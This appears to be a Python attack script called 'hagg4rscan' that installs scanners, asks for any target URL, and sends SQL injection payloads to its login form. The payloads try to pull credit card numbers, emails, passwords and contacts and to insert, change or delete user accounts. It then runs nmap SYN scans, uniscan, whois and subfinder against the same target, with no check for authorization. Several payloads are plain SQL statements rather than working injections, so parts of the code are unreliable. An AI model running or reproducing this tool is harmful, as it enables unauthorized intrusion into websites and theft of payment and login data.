import os
import subprocess
import requests
from requests.exceptions import RequestException, SSLError

def run_command(command):
    """Run a command and return its output."""
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def run_sudo_command(command):
    """Run a command with sudo and return its output."""
    result = subprocess.run(['sudo'] + command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def save_to_file(filepath, data):
    """Save data to a file."""
    with open(filepath, 'a') as file:
        file.write(data + '\n')

def install_tools():
    """Install necessary tools if not already installed."""
    tools = {
        "uniscan": ["sudo", "apt-get", "install", "-y", "uniscan"],
        "nmap": ["sudo", "apt-get", "install", "-y", "nmap"],
        "sqlmap": ["sudo", "apt-get", "install", "-y", "sqlmap"],
        "whois": ["sudo", "apt-get", "install", "-y", "whois"],
        "subfinder": ["sudo", "apt-get", "install", "-y", "subfinder"]
    }
    
    for tool, install_command in tools.items():
        print(f"Checking if {tool} is installed...")
        if not is_tool_installed(tool):
            print(f"{tool} not found. Installing {tool}...")
            stdout, stderr = run_sudo_command(install_command)
            if stdout:
                print(stdout)
            if stderr:
                print(stderr)
        else:
            print(f"{tool} is already installed.")

def is_tool_installed(tool_name):
    """Check if a tool is installed."""
    return subprocess.call(["which", tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    """Print the header 'hagg4rscan'."""
    header = """
    \033[91m
    ,:'/¯/`:,       .·/¯/`:,'                ,.-:~:-.                             __'                              __'                          ,.-:~:-.                .:'/*/'`:,·:~·–:.,           
  /:/_/::::/';    /:/_/::::';             /':::::::::'`,                    ,.·:'´::::::::`'·-.                ,.·:'´::::::::`'·-.                 /':::::::::'`,             /::/:/:::/:::;::::::/`':.,'     
 /:'     '`:/::;  /·´    `·,::';          /;:-·~·-:;':::',                 '/::::::::::::::::::';             '/::::::::::::::::::';              /;:-·~·-:;':::',          /·*'`·´¯'`^·-~·:–-'::;:::'`;    
 ;         ';:';  ;         ';:;        ,'´          '`:;::`,              /;:· '´ ¯¯  `' ·-:::/'            /;:· '´ ¯¯  `' ·-:::/'            ,'´          '`:;::`,        '\                       '`;::'i‘  
 |         'i::i  i         'i:';°      /                `;::\           /.'´      _         ';/' ‘         /.'´      _         ';/' ‘          /                `;::\         '`;        ,– .,        'i:'/   
 ';        ;'::/¯/;        ';:;‘'    ,'                   '`,::;       ,:     ,:'´::;'`·.,_.·'´.,    ‘    ,:     ,:'´::;'`·.,_.·'´.,    ‘     ,'                   '`,::;         i       i':/:::';       ;/'    
 'i        i':/_/:';        ;:';°   i'       ,';´'`;         '\:::', ‘  /     /':::::/;::::_::::::::;‘    /     /':::::/;::::_::::::::;‘     i'       ,';´'`;         '\:::', ‘     i       i/:·'´       ,:''      
  ;       i·´   '`·;       ;:/°  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯     ¯'`·;:::¦‘  ,'        ;' /´:`';         ';:::'i‘     '; '    ,:,     ~;'´:::'`:,   
  ';      ;·,  '  ,·;      ;/'    ;        ;/:;::;:';         ',:::;'i     ';::::::'\             ';:';‘ 'i     ';::::::'\             ';:';‘  ;        ;/:;::;:';         ',:::;     'i      i:/\       `;::::/:'`;'
   ';    ';/ '`'*'´  ';    ';/' '‘  'i        '´        `'         'i::'/ ;      '`·:;:::::`'*;:'´      |/'   ;      '`·:;:::::`'*;:'´      |/'  'i        '´        `'         'i::'/      ;     ;/   \       '`:/::::/'
    \   /          '\   '/'      ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘   \          '`*^*'´         /'  ‘ ¦       '/`' *^~-·'´\         ';'/'‚      ';   ,'       \         '`;/' 
     '`'´             `''´   '    '`., .·´              `·.,_,.·´  ‚    `·.,               ,.-·´          `·.,               ,.-·´      '`., .·´              `·.,_,.·´  ‚       `'*´          '`~·-·^'´    
                      '                                                    '`*^~·~^*'´                     '`*^~·~^*'´                                                                                
    \033[0m
    """
    print(header)

def check_website_status(url):
    """Check if the website is accessible."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"The website {url} is accessible.")
            return True
        else:
            print(f"The website {url} is not accessible. Status code: {response.status_code}")
            return False
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return False

def perform_sql_injection(target_url):
    """Perform SQL Injection using the provided payloads."""
    payloads = [
        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
        "' OR 1=1 UNION SELECT email FROM users --",
        "' OR 1=1 UNION SELECT password FROM users --",
        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --",
        "SELECT * FROM users WHERE username='admin';",
        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');",
        "UPDATE users SET password='newpassword' WHERE username='admin';",
        "DELETE FROM users WHERE username='olduser';",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
        "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
    ]

    for payload in payloads:
        data = {
            'username': f'admin{payload}',
            'password': 'password'  # Update with the correct password field if needed
        }

        try:
            response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
            if "error" in response.text.lower():
                print(f"Payload: {payload} might cause an error")
            else:
                print(f"Payload: {payload} - Response: {response.text}")  # This will display the extracted data
        except SSLError as e:
            print(f"SSL Error: {e}")
        except RequestException as e:
            print(f"Request Error: {e}")

def main():
    # Print the header
    print_header()
    
        # Get target URL from the user
    target_url = input("Enter the URL of the website to check: ").strip()
    
    # Create a directory for storing results
    results_dir = 'scan_results'
    if not os.path.exists(results_dir):
        os.makedirs(results_dir)
    
    # Define result file paths
    results_file = os.path.join(results_dir, 'results.txt')
    uniscan_file = os.path.join(results_dir, 'uniscan_output.txt')
    nmap_file = os.path.join(results_dir, 'nmap_output.txt')
    whois_file = os.path.join(results_dir, 'whois_output.txt')
    subfinder_file = os.path.join(results_dir, 'subfinder_output.txt')

    # Check if the target URL is accessible
    if check_website_status(target_url):
        # Perform SQL Injection tests
        print("Performing SQL Injection tests...")
        perform_sql_injection(target_url)
        
        # Save results to a file
        print(f"Saving results to {results_file}...")
        save_to_file(results_file, "SQL Injection test results:")
        save_to_file(results_file, f"Target URL: {target_url}")
        
        # Run uniscan
        print("Running uniscan...")
        stdout, stderr = run_command(["uniscan", "-u", target_url, "-qweds"])
        save_to_file(uniscan_file, stdout)
        save_to_file(uniscan_file, "Scan by Haggar")
        if stderr:
            save_to_file(uniscan_file, "Uniscan errors:")
            save_to_file(uniscan_file, stderr)
        
        # Run nmap scan
        print("Running nmap scan...")
        stdout, stderr = run_command(["nmap", "-sS", "-sV", "-T4", target_url])
        save_to_file(nmap_file, stdout)
        save_to_file(nmap_file, "Scan by Haggar")
        if stderr:
            save_to_file(nmap_file, "Nmap errors:")
            save_to_file(nmap_file, stderr)
        
        # Run whois lookup
        print("Running whois lookup...")
        stdout, stderr = run_command(["whois", target_url])
        save_to_file(whois_file, stdout)
        save_to_file(whois_file, "Scan by Haggar")
        if stderr:
            save_to_file(whois_file, "Whois errors:")
            save_to_file(whois_file, stderr)
        
        # Run subfinder
        print("Running subfinder...")
        stdout, stderr = run_command(["subfinder", "-d", target_url])
        save_to_file(subfinder_file, stdout)
        save_to_file(subfinder_file, "Scan by Haggar")
        if stderr:
            save_to_file(subfinder_file, "Subfinder errors:")
            save_to_file(subfinder_file, stderr)
        
        print(f"All results have been saved to the {results_dir} directory")

if __name__ == "__main__":
    install_tools()
    clear_screen()
    main()
    